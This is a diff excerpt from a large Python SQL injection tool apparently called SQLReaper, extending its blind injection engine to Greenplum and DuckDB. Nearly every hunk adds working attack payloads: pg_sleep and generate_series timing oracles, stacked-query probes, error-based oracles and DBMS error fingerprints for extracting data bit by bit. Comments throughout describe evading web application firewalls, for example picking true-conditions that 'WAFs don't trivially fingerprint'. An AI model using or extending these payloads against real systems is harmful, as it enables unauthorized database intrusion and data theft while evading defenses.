+                 " AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -", "SUBSTRING+GENERATE_SERIES(numeric)"),
+            ],
+            "DuckDB": [
+                (f"'; SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN pg_sleep({_sleep_sec}) END-- -",
+                 f"'; SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN pg_sleep({_sleep_sec}) END-- -", "SUBSTRING+pg_sleep"),
+                (f"'; SELECT pg_sleep(CASE WHEN 7*13=91 THEN {_sleep_sec} ELSE 0 END)-- -",
+                 f"'; SELECT pg_sleep(CASE WHEN 7*13=92 THEN {_sleep_sec} ELSE 0 END)-- -", "STACKED+arithmetic+pg_sleep"),
+                (f" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN pg_sleep({_sleep_sec}) ELSE pg_sleep(0) END) IS NULL-- -",
+                 f" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN pg_sleep({_sleep_sec}) ELSE pg_sleep(0) END) IS NULL-- -", "SUBSTRING+pg_sleep(numeric)"),
                 (" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
                  " AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -", "SUBSTRING+GENERATE_SERIES(numeric)"),
             ],
@@ -123666,6 +124186,8 @@ class TechniqueCascadeEngine:
             "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Greenplum":       "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "DuckDB":          "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":           "ISNULL(NULL)",
             "MariaDB":         "ISNULL(NULL)",
             "TiDB":            "ISNULL(NULL)",
@@ -123699,6 +124221,9 @@ class TechniqueCascadeEngine:
             "Ingres":     ["DBMSINFO('VERSION')", "DBMSINFO('DATABASE')", "DBMSINFO('SYSTEM_USER')"],
             "CockroachDB":["version()", "current_database()", "current_user"],
             "Amazon Redshift":["version()", "current_database()", "current_user"],
+            "Greenplum":  ["version()", "current_database()", "current_user"],
+            "DuckDB":     ["version()", "current_database()", "current_user"],
+            "YugabyteDB": ["version()", "current_database()", "current_user"],
             "Informix":  ["DBINFO('version','full')", "DBINFO('dbname')", "USER"],
             "Generic":    ["VERSION()", "DATABASE()", "USER()", "@@version", "current_database()"],
         }
@@ -123713,7 +124238,8 @@ class TechniqueCascadeEngine:
                 return [template]
             # Use DBMS-native evasive true conditions that WAFs don't trivially fingerprint.
             # Avoid literal 1=1 / 2=2 / 'a'='a' — WAFs block these on sight.
-            if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                         "Greenplum", "DuckDB"):
                 # BUG-EVASIVE-COND-PG-CRDB FIX: wire-compat PG DBMSes share the same functions.
                 conds = [
                     "ARRAY_LOWER(ARRAY[1,2,3],1)=1"  # BUG-PG-ARRAY-LOWER-TYPE FIX: integer return compared to float literal; use integer,
@@ -131573,7 +132099,7 @@ class UniversalScanOrchestrator:
             #   - _send_injected routing so tamper chains and mutation apply (Req 6)
             #   - _EXTRACTION_STARTED guard to skip when extraction already running (Req 4)
             if result.detection.technique == "BT" and _confirmed_dbms in ("PostgreSQL", "MySQL", "MariaDB", "TiDB", "MSSQL",
-                                                                             "CockroachDB", "YugabyteDB", "Amazon Redshift"):  # BUG-STK-DETECT-NEWDBMS FIX: all wire-compat DBMSes support stacked query probing via BT technique
+                                                                             "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):  # BUG-STK-DETECT-NEWDBMS FIX: all wire-compat DBMSes support stacked query probing via BT technique
                 if not _EXTRACTION_STARTED[0]:
                     print("[*] Testing stacked query support...", flush=True)
                     stacked_supported = False
@@ -132192,6 +132718,8 @@ class UniversalScanOrchestrator:
                                                     "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                                                     "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                                                     "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                    "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                    "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                                                     "MySQL":           "ISNULL(NULL)",
                                                     "MariaDB":         "ISNULL(NULL)",
                                                     "TiDB":            "ISNULL(NULL)",
@@ -132223,6 +132751,8 @@ class UniversalScanOrchestrator:
                                                             "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                                                             "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                                                             "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                                            "Greenplum": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                                            "DuckDB": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                                                             "MySQL":           "ISNULL(1e0)",
                                                             "MariaDB":         "ISNULL(1e0)",
                                                             "TiDB":            "ISNULL(1e0)",
@@ -132461,7 +132991,8 @@ class UniversalScanOrchestrator:
                                                                     f"WHERE ({_cond})) IS NOT NULL-- -")
                                                         else:
                                                             _pay = f"{_o}{_ipfx} AND IF({_cond},SLEEP({_ts}),0)-- -"
-                                                    elif _db in ('PostgreSQL', 'CockroachDB', 'YugabyteDB', 'Amazon Redshift'):
+                                                    elif _db in ('PostgreSQL', 'CockroachDB', 'YugabyteDB', 'Amazon Redshift',
+                                                                 'Greenplum', 'DuckDB'):
                                                         # BUG-ITO-CRDB-YG-SYBASE-BRANCH FIX: CockroachDB/YugabyteDB are PG-wire-compatible;
                                                         # pg_sleep() works on both. The previous else branch emitted SLEEP() which does
                                                         # not exist in CockroachDB/YugabyteDB, causing the timing oracle to always fail
@@ -132470,6 +133001,10 @@ class UniversalScanOrchestrator:
                                                         # BUG-ITO-REDSHIFT FIX: Amazon Redshift is PG-wire-compatible; pg_sleep() works.
                                                         # Without this fix Redshift fell to else: SLEEP() which doesn't exist in Redshift
                                                         # → SQL error → Exception → return False → all bits 0 → garbage extraction.
+                                                        # BUG-ITO-GREENPLUM-DUCKDB FIX (HIGH; Greenplum/DuckDB; _inline_timing_oracle;
+                                                        # T/TH/HQ/BT; all surfaces): Greenplum and DuckDB were absent and fell to else:
+                                                        # IF(cond,SLEEP(t),0) — MySQL syntax that does not exist in either → SQL error →
+                                                        # fast response → oracle always False → empty extraction for all T-technique sessions.
                                                         # BUG-ITO-PG-VOID-CAST FIX: pg_sleep() returns void. On PostgreSQL ≤12 the DBMS
                                                         # raises "function returning void cannot appear in this context" for the bare
                                                         # subquery form (SELECT pg_sleep(N)). CAST(pg_sleep(N) AS TEXT) coerces void
@@ -133229,6 +133764,8 @@ class UniversalScanOrchestrator:
                                                             "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                                                             "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                                                             "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                            "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                            "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                                                             "MySQL":           "ISNULL(NULL)",
                                                             "MariaDB":         "ISNULL(NULL)",
                                                             "TiDB":            "ISNULL(NULL)",
@@ -133242,6 +133779,8 @@ class UniversalScanOrchestrator:
                                                             "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                                                             "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                                                             "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                                            "Greenplum": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                                            "DuckDB": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                                                             "MySQL":           "ISNULL(1e0)",
                                                             "MariaDB":         "ISNULL(1e0)",
                                                             "TiDB":            "ISNULL(1e0)",
@@ -133382,6 +133921,8 @@ class UniversalScanOrchestrator:
                                                         "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                                                         "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                                                         "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                        "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                        "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                                                         "MySQL":           "ISNULL(NULL)",
                                                         "MariaDB":         "ISNULL(NULL)",
                                                         "TiDB":            "ISNULL(NULL)",
@@ -133593,7 +134134,8 @@ class UniversalScanOrchestrator:
                                                                     f"information_schema.tables b "
                                                                     f"WHERE ({_cond})) IS NOT NULL")
                                                             elif _db in ('PostgreSQL', 'CockroachDB',
-                                                                         'YugabyteDB', 'Amazon Redshift'):
+                                                                         'YugabyteDB', 'Amazon Redshift',
+                                                                         'Greenplum', 'DuckDB'):
                                                                 _hq_rows_st = max(1000000, min(int(_ts * 1000000), 8000000))
                                                                 _timing_inner = (
                                                                     f"(SELECT count(*) FROM "
@@ -133627,7 +134169,8 @@ class UniversalScanOrchestrator:
                                                                     f"information_schema.tables b "
                                                                     f"WHERE ({_cond})) IS NOT NULL-- -")
                                                         elif _db in ('PostgreSQL', 'CockroachDB',
-                                                                     'YugabyteDB', 'Amazon Redshift'):
+                                                                     'YugabyteDB', 'Amazon Redshift',
+                                                                     'Greenplum', 'DuckDB'):
                                                             _hq_rows_st = max(1000000, min(int(_ts * 1000000), 8000000))
                                                             _pay = (f"{_o}{_ipfx} AND (SELECT count(*) FROM "
                                                                     f"generate_series(1,CASE WHEN ({_cond}) "
@@ -133682,6 +134225,8 @@ class UniversalScanOrchestrator:
                                                                         "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                                                                         "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                                                                         "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                                        "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                                        "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                                                                         "MySQL": "ISNULL(NULL)", "MariaDB": "ISNULL(NULL)", "TiDB": "ISNULL(NULL)",
                                                                         "MSSQL": "(1e0 IS NOT NULL)", "Sybase": "(1e0 IS NOT NULL)",
                                                                         "Oracle": "(NVL(NULL,1e0) IS NOT NULL)",
@@ -133692,6 +134237,8 @@ class UniversalScanOrchestrator:
                                                                         "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                                                                         "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                                                                         "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                                                        "Greenplum": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                                                        "DuckDB": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                                                                         "MySQL": "ISNULL(1e0)", "MariaDB": "ISNULL(1e0)", "TiDB": "ISNULL(1e0)",
                                                                         "MSSQL": "(1e0 IS NULL)", "Sybase": "(1e0 IS NULL)",
                                                                         "Oracle": "(NVL(NULL,1e0) IS NULL)",
@@ -135382,7 +135929,7 @@ class PayloadEntropyScorer:
         n=len(payload)
         from collections import Counter
         c=Counter(payload)
-        return -sum((v/n)*_math.log2(v/n) for v in c.values() if v>0)
+        return -sum((v/n)*math.log2(v/n) for v in c.values() if v>0)
 
     @staticmethod
     def structural_diversity(payload):
@@ -135399,7 +135946,7 @@ class PayloadEntropyScorer:
 
     @classmethod
     def score(cls,payload):
-        e = cls.entropy(payload)/_math.log2(95)
+        e = cls.entropy(payload)/math.log2(95)
         return e*0.4+cls.structural_diversity(payload)*0.6
 
     @classmethod
@@ -136269,7 +136816,7 @@ class ScannerV14(ScannerV13):
                                                                     ("' AND CAST('abc' AS DECIMAL)-- -", "CAST_decimal"),
                                                                     (f"' AND (SELECT 1 FROM {_nonexist_tbl_hdr})-- -", "table"),
                                                                 ]
-                                                            elif _err_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                                                            elif _err_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                                                                 # BUG-HEADERINJECT-PCV-PG-CRDB FIX: wire-compatible PG DBMSes support
                                                                 # ::integer cast and 1/0 division error identical to PostgreSQL.
                                                                 _pcv_c_fallbacks = [
@@ -136337,6 +136884,13 @@ class ScannerV14(ScannerV13):
                                                                                     "amazon redshift", "redshift",
                                                                                     "division by zero", "invalid input syntax for type",
                                                                                     "sqlstate: 22012", "sqlstate: 42601"],
+                                                                "Greenplum": ["error:  division by zero", "error:  invalid input syntax",
+                                                                              "greenplum", "division by zero",
+                                                                              "invalid input syntax for type",
+                                                                              "sqlstate: 22012", "sqlstate: 42601"],
+                                                                "DuckDB": ["error:  division by zero", "error:  invalid input syntax",
+                                                                           "duckdb", "division by zero",
+                                                                           "binder error", "parser error"],
                                                                 "MSSQL": ["divide by zero error encountered", "conversion failed when converting",
                                                                           "divide by zero", "arithmetic overflow", "invalid object name"],
                                                                 "Oracle": ["ora-00904", "ora-01476", "ora-01722", "ora-00933", "ora-00907",
@@ -136805,7 +137359,7 @@ class ScannerV14(ScannerV13):
                                                                         (" AND CAST('abc' AS INT)-- -", "CAST-ctx"),
                                                                         ("' AND CAST('abc' AS DECIMAL)-- -", "CAST_decimal"),
                                                                     ]
-                                                                elif _ed in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):  # BUG-JSON-PCV-CRDB-YG-REDSHIFT FIX: PG-compat engines use ::integer cast and 1/0 division
+                                                                elif _ed in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):  # BUG-JSON-PCV-CRDB-YG-REDSHIFT FIX: PG-compat engines use ::integer cast and 1/0 division
                                                                     _pcv_c_fallbacks = [
                                                                         ("' AND 1/0-- -", "division"),
                                                                         (" AND 1/0-- -", "division-ctx"),
@@ -136850,6 +137404,10 @@ class ScannerV14(ScannerV13):
                                                                                    "division by zero", "invalid input syntax for type"],  # BUG-JSON-PCV-YG-ERRPAT FIX
                                                                     "Amazon Redshift": ["error:  division by zero", "redshift",
                                                                                         "division by zero", "invalid input syntax for type"],  # BUG-JSON-PCV-REDSHIFT-ERRPAT FIX
+                                                                    "Greenplum": ["error:  division by zero", "greenplum",
+                                                                                  "division by zero", "invalid input syntax for type"],
+                                                                    "DuckDB": ["error:  division by zero", "duckdb",
+                                                                               "division by zero", "binder error"],
                                                                     "MSSQL": ["divide by zero error encountered", "conversion failed when converting",
                                                                               "divide by zero", "arithmetic overflow"],
                                                                     "Oracle": ["ora-00904", "ora-01476", "ora-01722", "ora-00933", "ora-00907",
@@ -137225,7 +137783,7 @@ class ScannerV14(ScannerV13):
                                                                 (" AND CAST('abc' AS INT)-- -", "CAST-ctx"),
                                                                 ("' AND CAST('abc' AS DECIMAL)-- -", "CAST_decimal"),
                                                             ]
-                                                        elif _gql_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                                                        elif _gql_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                                                             # BUG-GQLINJECT-PCV-PG-CRDB FIX: wire-compatible PG DBMSes support
                                                             # ::integer cast and 1/0 division error like PostgreSQL.
                                                             _pcv_c_fallbacks = [
@@ -137275,6 +137833,10 @@ class ScannerV14(ScannerV13):
                                                                            "division by zero", "invalid input syntax for type"],
                                                             "Amazon Redshift": ["error:  division by zero", "redshift",
                                                                                 "division by zero", "invalid input syntax for type"],
+                                                            "Greenplum": ["error:  division by zero", "greenplum",
+                                                                          "division by zero", "invalid input syntax for type"],
+                                                            "DuckDB": ["error:  division by zero", "duckdb",
+                                                                       "division by zero", "binder error"],
                                                             "MSSQL": ["divide by zero error encountered", "conversion failed when converting",
                                                                       "divide by zero", "arithmetic overflow"],
                                                             "Oracle": ["ora-00904", "ora-01476", "ora-01722", "ora-00933", "ora-00907",
@@ -137631,7 +138193,7 @@ class ScannerV14(ScannerV13):
                                                             (" AND CAST('abc' AS INT)-- -", "CAST-ctx"),
                                                             ("' AND CAST('abc' AS DECIMAL)-- -", "CAST_decimal"),
                                                         ]
-                                                    elif _xml_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                                                    elif _xml_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                                                         # BUG-XMLINJECT-PCV-PG-CRDB FIX: wire-compatible PG DBMSes support
                                                         # ::integer cast and 1/0 division error like PostgreSQL.
                                                         _pcv_c_fallbacks = [
@@ -137681,6 +138243,10 @@ class ScannerV14(ScannerV13):
                                                                        "division by zero", "invalid input syntax for type"],
                                                         "Amazon Redshift": ["error:  division by zero", "redshift",
                                                                             "division by zero", "invalid input syntax for type"],
+                                                        "Greenplum": ["error:  division by zero", "greenplum",
+                                                                      "division by zero", "invalid input syntax for type"],
+                                                        "DuckDB": ["error:  division by zero", "duckdb",
+                                                                   "division by zero", "binder error"],
                                                         "MSSQL": ["divide by zero error encountered", "conversion failed when converting",
                                                                   "divide by zero", "arithmetic overflow"],
                                                         "Oracle": ["ora-00904", "ora-01476", "ora-01722", "ora-00933", "ora-00907",
@@ -143570,7 +144136,7 @@ class SQLPayloadTransformer:
 
         #  Strategy 2: Arithmetic multiplication (no CASE WHEN) 
         # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB/Amazon Redshift.
-        if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             arith_arg = f"({condition})::int * {t}"
             mod2 = T.replace_function_arg(p, r"pg_sleep", arith_arg)
             if mod2:
@@ -143661,7 +144227,7 @@ class SQLPayloadTransformer:
         # Uses generate_series or other computational delay instead of sleep()
         # WAF may not recognize these as timing attacks
         # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB/Amazon Redshift.
-        if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             # Heavy generate_series delay
             heavy_delay = f"(SELECT count(*) FROM generate_series(1, CASE WHEN ({condition}) THEN 5000000 ELSE 1 END))"
             results.append(("heavy_computation_pg", 
@@ -143699,7 +144265,7 @@ class SQLPayloadTransformer:
         # Works on all DBMSes, bypasses sleep-focused WAF rules
         
         # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB/Amazon Redshift.
-        if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             cross_join = f"(SELECT count(*) FROM information_schema.tables a, information_schema.tables b WHERE ({condition}))"
             results.append(("cross_join_pg",
                            f"{p} AND {cross_join}>0-- -",
@@ -143727,7 +144293,7 @@ class SQLPayloadTransformer:
         #  Strategy 11: Nested Function Calls (Bypass Function Detection) 
         # Nest the sleep function inside other functions to bypass WAF signatures
         # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB/Amazon Redshift.
-        if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             nested = f"COALESCE(CASE WHEN ({condition}) THEN pg_sleep({t}) END, 0)"
             results.append(("nested_pg",
                            p.replace(f"pg_sleep({t})", nested) if f"pg_sleep({t})" in p else p,
@@ -143804,6 +144370,7 @@ class MultiStrategyExtractor:
         # BUG-SLEEPFN-YUGABYTE FIX: YugabyteDB is PG-wire-compatible; pg_sleep() is valid.
         # BUG-SLEEPFN-REDSHIFT FIX: Amazon Redshift is PG-wire-compatible; pg_sleep() valid.
         "YugabyteDB":      "pg_sleep({t})",   "Amazon Redshift": "pg_sleep({t})",
+        "Greenplum":       "pg_sleep({t})",   "DuckDB":          "pg_sleep({t})",
         "MySQL":       "SLEEP({t})",      "MariaDB":     "SLEEP({t})",
         "TiDB":        "SLEEP({t})",
         "MSSQL":       "WAITFOR DELAY '0:0:{t}'",
@@ -143842,6 +144409,7 @@ class MultiStrategyExtractor:
         # BUG-HEAVYFROM-YUGABYTE FIX: YugabyteDB uses pg_class like PostgreSQL.
         # BUG-HEAVYFROM-REDSHIFT FIX: Amazon Redshift uses pg_class like PostgreSQL.
         "YugabyteDB":      "pg_class",     "Amazon Redshift": "pg_class",
+        "Greenplum":       "pg_class",     "DuckDB":          "information_schema.tables",
         "MySQL":       "information_schema.columns",
         "MariaDB":     "information_schema.columns",
         "TiDB":        "information_schema.columns",
@@ -144327,7 +144895,7 @@ class MultiStrategyExtractor:
                 _suffix = _det[_num_match.end(3):]
                 # Replace the number with condition-based expression
                 # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB/Amazon Redshift.
-                if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                     _tmpl_base = _prefix + "({cond})::int*{T}" + _suffix
                 elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
                     # BUG-MSE-SLEEPALITH-TIDB FIX: TiDB is MySQL-wire-compatible; arithmetic
@@ -144445,6 +145013,8 @@ class MultiStrategyExtractor:
             "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":           "ISNULL(NULL)",
             "MariaDB":         "ISNULL(NULL)",
             "TiDB":            "ISNULL(NULL)",
@@ -144464,6 +145034,8 @@ class MultiStrategyExtractor:
             "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
             "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
             "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "Greenplum": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "DuckDB": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
             "MySQL":           "ISNULL(1e0)",
             "MariaDB":         "ISNULL(1e0)",
             "TiDB":            "ISNULL(1e0)",
@@ -144591,7 +145163,7 @@ class MultiStrategyExtractor:
         _s = self._stacked
         _err_methods = []
         # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB/Amazon Redshift.
-        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             _err_methods = [
                 ("div0",    "SELECT 1/0",              "SELECT 1"),
                 ("cast",    "SELECT CAST('x' AS INT)", "SELECT 1"),
@@ -144677,6 +145249,8 @@ class MultiStrategyExtractor:
                         "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                         "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                         "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                        "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                        "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                         "MySQL":           "ISNULL(NULL)",
                         "MariaDB":         "ISNULL(NULL)",
                         "TiDB":            "ISNULL(NULL)",
@@ -144829,7 +145403,7 @@ class MultiStrategyExtractor:
         # Build payload using DO $$ block  condition inside IF, not CASE WHEN.
         # WAFs can't parse PL/pgSQL blocks.
         # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB/Amazon Redshift.
-        if _s and self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if _s and self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             # Map error method to the statement that causes the error
             _err_stmts = {
                 "cast":     "PERFORM CAST('x' AS INT)",
@@ -144862,7 +145436,7 @@ class MultiStrategyExtractor:
             #   SQLite: 1/0 returns NULL (not an error) in SQLite — so the condition always
             #           gives the same response. The inline error oracle is non-functional for
             #           SQLite; just use the CASE form which is at least syntactically valid.
-            if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                 # FIX-MSE-INLINE-ARITH: Use arith_inline form `1/(({cond})::int-1)=1`
                 # instead of CASE WHEN. The SQLMutationEngine comment-splitter breaks
                 # CASE/WHEN keywords (C/*x*/A/*x*/S/*x*/E is not the keyword CASE in PG)
@@ -144997,7 +145571,7 @@ class MultiStrategyExtractor:
         _tbl = self._HEAVY_FROM.get(self.dbms, "pg_class")
         # Try different heavy operations
         _heavy_variants = []
-        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             _heavy_variants = [
                 ("gen_series", self._build_stacked("SELECT COUNT(*) FROM generate_series(1,500000)") if self._stacked
                     else self._build_inline("(SELECT COUNT(*) FROM generate_series(1,500000))>0")),
@@ -145027,6 +145601,8 @@ class MultiStrategyExtractor:
             "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":           "ISNULL(NULL)",
             "MariaDB":         "ISNULL(NULL)",
             "TiDB":            "ISNULL(NULL)",
@@ -145077,7 +145653,7 @@ class MultiStrategyExtractor:
     async def _eval_heavy(self, cond):
         """Evaluate via heavy query  condition controls row count, no WHERE."""
         _label = self._heavy_info.get("label", "")
-        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift") and "gen_series" in _label:
+        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB") and "gen_series" in _label:
             # generate_series: condition multiplies row count
             if self._heavy_info["stacked"]:
                 p = self._build_stacked(f"SELECT COUNT(*) FROM generate_series(1, ({cond})::int * 500000)")
@@ -145153,7 +145729,7 @@ class MultiStrategyExtractor:
         _using_sleep_tmpl = bool(_sleep_info_tmpl and "{cond}" in _sleep_info_tmpl)
         if _using_sleep_tmpl:
             p = _sleep_info_tmpl.replace("{cond}", cond)
-        elif self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift") and self._micro_info["stacked"]:
+        elif self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB") and self._micro_info["stacked"]:
             # generate_series gated by condition  no WHERE clause
             p = self._build_stacked(f"SELECT COUNT(*) FROM generate_series(1, ({cond})::int * 500000)")
         elif self._micro_info["stacked"]:
@@ -145187,7 +145763,7 @@ class MultiStrategyExtractor:
     # 
     async def _probe_bitwise(self):
         _tbl = self._HEAVY_FROM.get(self.dbms, "pg_class")
-        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             # Bit 1 of 'A' = 1, bit 7 = 0
             if self._stacked:
